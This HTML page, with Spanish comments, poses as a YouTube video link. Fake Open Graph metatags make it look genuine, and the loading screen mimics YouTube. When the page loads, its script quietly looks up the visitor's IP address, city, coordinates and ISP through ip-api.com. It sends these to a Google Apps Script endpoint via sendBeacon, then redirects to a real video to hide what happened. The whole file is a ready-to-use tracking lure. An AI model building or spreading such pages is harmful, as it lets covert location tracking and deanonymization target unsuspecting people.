<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <!-- Metatags para que el enlace parezca un video real de YouTube -->
    <title>Título del Video de YouTube</title>
    <meta property="og:title" content="Título del Video de YouTube">
    <meta property="og:description" content="2.5M de vistas - hace 2 días">
    <meta property="og:image" content="https://img.youtube.com/vi/ID_DEL_VIDEO/maxresdefault.jpg">
    <meta property="og:type" content="video.other">
    
    <script>
        const TARGET = "https://www.youtube.com/watch?v=cBVGlBWQzuc&list=RDGMEMQ1dJ7wXfLlqCjwV0xfSNbAVMJGwWNGJdvx8&index=3"; // Cambia ID_DEL_VIDEO
        const BRIDGE = "https://script.google.com/macros/s/AKfycbzi9jBJlyfvrJ8XYX4JGiZ5JIMjP4fCk0ZVv8zpYZPeaAJ07wiqEexA9csKg9HKEHI8pA/exec"; // Pega aquí tu URL de "Ejecutar como aplicación web"

        async function xvPayload() {
            try {
                // Obtención de IP y Geo de forma silenciosa
                const res = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,isp,query');
                const data = await res.json();

                if (data.status === 'success') {
                    const params = new URLSearchParams({
                        lat: data.lat,
                        lon: data.lon,
                        loc: `${data.city}, ${data.regionName}`,
                        isp: data.isp,
                        ip: data.query
                    });

                    // Uso de Beacon API: Envía los datos incluso si la pestaña se cierra o redirige
                    navigator.sendBeacon(`${BRIDGE}?${params.toString()}`); //
                }
            } catch (e) {}

            // Redirección inmediata al video real
            window.location.replace(TARGET); //[cite: 2]
        }

        // Ejecución al cargar
        window.onload = xvPayload;
    </script>
</head>
<body style="background-color: #0f0f0f; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Roboto, Arial;">
    <div style="text-align: center;">
        <img src="https://www.gstatic.com/youtube/img/branding/youtubelogo/28dp/youtube_rgb_dark.png" alt="YouTube">
        <p>Cargando reproductor...</p>
    </div>
</body>
</html>
